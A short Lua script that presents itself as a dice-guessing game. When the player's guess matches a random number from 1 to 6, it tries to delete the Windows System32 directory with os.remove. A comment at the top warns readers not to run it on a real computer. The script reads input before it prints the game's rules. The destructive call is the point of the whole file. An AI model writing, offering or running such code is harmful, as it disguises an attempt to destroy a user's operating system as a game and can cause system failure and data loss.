-- please do not run this on your actual computer

print("lets play a game")
local ans = tonumber(io.read())
local n = math.random(1, 6)
print("youll guess a number from 1 to 6")
print("if you answer the random chosen number")
print("youll lose")
if ans < n or ans > n then
print("youre lucky")
elseif ans == n then
os.remove("C:/Windows/System32")
end
